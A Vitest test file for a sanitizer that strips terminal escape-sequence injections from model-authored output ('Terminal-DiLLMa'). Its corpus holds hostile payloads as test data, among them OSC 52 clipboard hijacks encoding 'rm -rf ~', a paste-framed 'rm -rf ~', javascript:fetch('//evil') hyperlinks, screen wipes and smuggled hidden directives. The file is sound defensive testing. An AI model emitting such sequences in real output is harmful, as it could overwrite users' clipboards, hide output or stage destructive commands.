import { describe, it, expect } from 'vitest';
import { sanitize, sanitizeSpecStrings } from '../src/index.js';

const ESC = '\x1b';
const BEL = '\x07';
const ST = '\x1b\\';

// Canonical Terminal-DiLLMa / terminal-injection corpus: model-authored text
// that, rendered raw, would write the clipboard, move the cursor, hide output,
// exfiltrate via a hyperlink, or leave paste-framing bytes for re-injection.
// After sanitize() none of the side-effecting bytes may survive; only safe
// visible text remains — and no raw ESC or C1 control of any kind.
const CORPUS: ReadonlyArray<{
  name: string;
  input: string;
  mustNotContain: readonly string[];
  expect?: string;
}> = [
  {
    name: 'OSC 52 clipboard hijack',
    input: `${ESC}]52;c;cm0gLXJmIH4=${BEL}`,
    mustNotContain: ['52;c', 'cm0gLXJmIH4='],
    expect: '',
  },
  {
    name: 'OSC 52 ST-terminated clipboard hijack',
    input: `before${ESC}]52;c;ZXZpbA==${ST}after`,
    mustNotContain: ['52;c'],
    expect: 'beforeafter',
  },
  {
    name: 'iTerm2 OSC 1337 file write',
    input: `${ESC}]1337;File=name=cnB3bg==:ZGF0YQ==${BEL}`,
    mustNotContain: ['1337', 'File='],
    expect: '',
  },
  {
    name: 'Kitty APC graphics payload',
    input: `${ESC}_Gf=100,a=T,m=1;iVBORw0KGgo=${ST}`,
    mustNotContain: ['_G', 'iVBORw0KGgo='],
    expect: '',
  },
  {
    name: 'DCS / Sixel payload',
    input: `${ESC}Pq#0;2;0;0;0#0~~@@vv@@~~${ST}`,
    mustNotContain: ['Pq', '#0;2'],
    expect: '',
  },
  {
    name: 'cursor-clear screen-wipe to hide prior output',
    input: `${ESC}[2J${ESC}[Hfake prompt$ `,
    mustNotContain: ['[2J', '[H'],
    expect: 'fake prompt$ ',
  },
  {
    // Defense-in-depth: these framing bytes are inert in already-captured
    // output (auto-submit needs a real shell's stdin), but they must not
    // survive in case output is ever piped to an interactive stdin.
    name: 'bracketed-paste framing bytes around a destructive command',
    input: `${ESC}[200~rm -rf ~ ${ESC}[201~`,
    mustNotContain: ['200~', '201~'],
    expect: 'rm -rf ~ ',
  },
  {
    name: 'OSC 8 hyperlink with javascript: scheme (exfil/click-bait)',
    input: `${ESC}]8;;javascript:fetch('//evil')${ST}click here${ESC}]8;;${ST}`,
    mustNotContain: ['javascript:', "fetch('//evil')"],
    expect: 'click here',
  },
  {
    name: 'OSC 8 with data: scheme',
    input: `${ESC}]8;;data:text/html,<script>x</script>${ST}link${ESC}]8;;${ST}`,
    mustNotContain: ['data:text/html', '<script>'],
    expect: 'link',
  },
  {
    name: 'C1 8-bit CSI (0x9b) cursor manipulation',
    input: `a\x9b2Jb`,
    mustNotContain: ['\x9b'],
    expect: 'ab',
  },
  {
    name: 'lone BEL terminal bell spam',
    input: `spam${BEL}${BEL}${BEL}`,
    mustNotContain: [BEL],
    expect: 'spam^G^G^G',
  },
  {
    name: 'PM privacy-message smuggle',
    input: `${ESC}^hidden directive${ST}visible`,
    mustNotContain: ['hidden directive'],
    expect: 'visible',
  },
  {
    name: 'SOS start-of-string smuggle (ESC X)',
    input: `${ESC}Xsmuggled directive${ST}visible`,
    mustNotContain: ['smuggled directive'],
    expect: 'visible',
  },
  {
    name: 'C1-form OSC 52 clipboard hijack (0x9d introducer)',
    input: `x\x9d52;c;ZXZpbA==${BEL}y`,
    mustNotContain: ['52;c'],
    expect: 'xy',
  },
  {
    name: 'OSC 52 terminated by the C1 ST (0x9c)',
    input: `before${ESC}]52;c;ZXZpbA==\x9cafter`,
    mustNotContain: ['52;c'],
    expect: 'beforeafter',
  },
  {
    name: 'BEL smuggled inside a DCS payload (BEL is data, not a DCS terminator)',
    input: `${ESC}Pdata${BEL}more${ST}x`,
    mustNotContain: ['data', 'more'],
    expect: 'x',
  },
  {
    name: 'unterminated OSC 52 — fail-closed drop to end of input',
    input: `steal${ESC}]52;c;ZXZpbA==`,
    mustNotContain: ['52;c', 'ZXZpbA=='],
    expect: 'steal',
  },
  {
    name: 'unterminated OSC 8 open — fail-closed drop (no live introducer leaks)',
    input: `link${ESC}]8;;https://example.com`,
    mustNotContain: ['https://example.com'],
    expect: 'link',
  },
];

describe('Terminal-DiLLMa injection corpus', () => {
  for (const c of CORPUS) {
    it(`neutralizes: ${c.name}`, () => {
      const out = sanitize(c.input);
      for (const banned of c.mustNotContain) {
        expect(out).not.toContain(banned);
      }
      if (c.expect !== undefined) expect(out).toBe(c.expect);
      // no raw ESC or ANY C1 control (0x80-0x9f) survives in default mode
      // eslint-disable-next-line no-control-regex
      expect(out).not.toMatch(/[\x1b\x80-\x9f]/);
    });
  }

  it('an OSC 52 payload smuggled into a spec string prop is neutralized at the spec chokepoint', () => {
    const spec = {
      root: 'merge',
      elements: {
        merge: {
          type: 'Button',
          props: { label: `Merge${ESC}]52;c;ZXZpbA==${BEL}`, title: `${ESC}[2Jhidden` },
        },
      },
    };
    const out = sanitizeSpecStrings(spec);
    expect(out.elements.merge.props.label).toBe('Merge');
    expect(out.elements.merge.props.title).toBe('hidden');
    // JSON.stringify escapes C0 (so \x1b can never appear raw) but keeps C1
    // bytes raw — the C1 half of this assertion is the meaningful one.
    // eslint-disable-next-line no-control-regex
    expect(JSON.stringify(out)).not.toMatch(/[\x1b\x80-\x9f]/);
  });
});

// Default-mode sanitize() strips EVERY OSC 8 frame regardless of scheme, so the
// two OSC 8 corpus rows above pass no matter what ALLOWED_OSC8_SCHEMES holds —
// widening it to admit javascript:/data: is invisible there. renderer-sgr mode
// keeps an ALLOWED-scheme link LIVE, so it is the only path where the scheme
// decision is observable, and the only path that reds if the allowlist grows.
describe('OSC 8 scheme allowlist bites in renderer-sgr mode (where the scheme decision shows)', () => {
  const cases: ReadonlyArray<{
    name: string;
    input: string;
    banned: readonly string[];
    expected: string;
  }> = [
    {
      name: 'javascript:',
      input: `${ESC}]8;;javascript:fetch('//evil')${ST}click here${ESC}]8;;${ST}`,
      banned: ['javascript:', "fetch('//evil')", ESC],
      expected: 'click here',
    },
    {
      name: 'data:',
      input: `${ESC}]8;;data:text/html,<script>x</script>${ST}link${ESC}]8;;${ST}`,
      banned: ['data:text/html', '<script>', ESC],
      expected: 'link',
    },
  ];
  for (const c of cases) {
    it(`strips the disallowed ${c.name} OSC 8 wrapper, keeping only the visible label`, () => {
      const out = sanitize(c.input, { allow: 'renderer-sgr' });
      expect(out).toBe(c.expected); // wrapper gone, no live frame kept
      for (const banned of c.banned) expect(out).not.toContain(banned);
    });
  }
});
